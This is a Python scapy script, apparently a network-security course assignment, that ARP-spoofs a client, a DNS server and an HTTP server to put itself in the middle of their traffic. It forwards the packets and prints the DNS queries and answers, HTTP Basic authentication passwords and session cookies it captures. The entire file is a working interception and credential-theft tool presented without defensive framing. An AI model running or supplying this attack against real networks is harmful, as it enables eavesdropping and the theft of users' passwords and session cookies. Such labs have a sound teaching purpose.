from scapy.all import *

import argparse
import sys
import threading
import time
import base64
import os
import re

def parse_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
	parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
	parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
	parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
	parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
	return parser.parse_args()


def debug(s):
	global verbosity
	if verbosity >= 1:
		print('#{0}'.format(s))
		sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
	global attackerIP
	result = sr1(ARP(op="who-has", psrc=attackerIP, pdst=IP), verbose=False)
	return result[ARP].hwsrc


#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
	while True:
		spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
		spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # Spoof httpServer ARP table
		spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
		spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # Spoof dnsServer ARP table
		time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
	debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
	send(ARP(op="is-at", psrc=src_ip, hwsrc=src_mac, pdst=dst_ip, hwdst=dst_mac))


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
	debug(f"restoring ARP table for {dstIP}")
	send(ARP(op="is-at", psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC))


# TODO: handle intercepted packets
def interceptor(packet):
	global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
	if packet[Ether].src == attackerMAC:
		return
	if packet.haslayer(IP):
		# DNS request
		if packet[IP].src == clientIP and packet[IP].dst == dnsServerIP:
			if packet.haslayer(DNS):
				if packet[DNS].rd == 1:
					if packet[DNS].qd is not None:
						hostname = ''.join(chr(i) for i in packet[DNS].qd.qname)
						print(f"*hostname: {hostname}")
			packet[Ether].src = attackerMAC
			packet[Ether].dst = dnsServerMAC
			sendp(packet)
		# DNS reply
		elif packet[IP].src == dnsServerIP and packet[IP].dst == clientIP:
			if packet.haslayer(DNS):
				if packet[DNS].an is not None:
					print(f"*hostaddr: {packet[DNS].an.rdata}")
			packet[Ether].src = attackerMAC
			packet[Ether].dst = clientMAC
			sendp(packet)
		# HTTP request
		elif packet[IP].src == clientIP and packet[IP].dst == httpServerIP:
			if packet.haslayer(Raw):
				sub = packet[Raw].load.decode('utf-8').split()
				auth = ''
				for index, col in enumerate(sub):
					if col == 'Basic':
						auth = base64.decodestring(sub[index+1].encode('utf-8'))
						break
				auth = auth.decode('utf-8').split(':')[1]
				print(f"*basicauth: {auth}")
			packet[Ether].src = attackerMAC
			packet[Ether].dst = httpServerMAC
			sendp(packet)
		# HTTP reply
		elif packet[IP].src == httpServerIP and packet[IP].dst == clientIP:
			if packet.haslayer(Raw):
				sub = packet[Raw].load.decode('utf-8').split()
				cookie = ''
				for index, col in enumerate(sub):
					if col == 'Set-Cookie:':
						cookie = sub[index+1]
						break
				print(f"*cookie: {cookie}")
			packet[Ether].src = attackerMAC
			packet[Ether].dst = clientMAC
			sendp(packet)


if __name__ == "__main__":
	args = parse_arguments()
	verbosity = args.verbosity
	if verbosity < 2:
		conf.verb = 0 # minimize scapy verbosity
	conf.iface = args.interface # set default interface

	clientIP = args.clientIP
	httpServerIP = args.httpIP
	dnsServerIP = args.dnsIP
	attackerIP = get_if_addr(args.interface)

	clientMAC = mac(clientIP)
	httpServerMAC = mac(httpServerIP)
	dnsServerMAC = mac(dnsServerIP)
	attackerMAC = get_if_hwaddr(args.interface)

	# start a new thread to ARP spoof in a loop
	spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
	spoof_th.start()

	# start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
	sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
	sniff_th.start()

	try:
		while True:
			pass
	except KeyboardInterrupt:
		restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
		restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
		restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
		restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
		sys.exit(1)

	restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
	restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
	restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
	restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
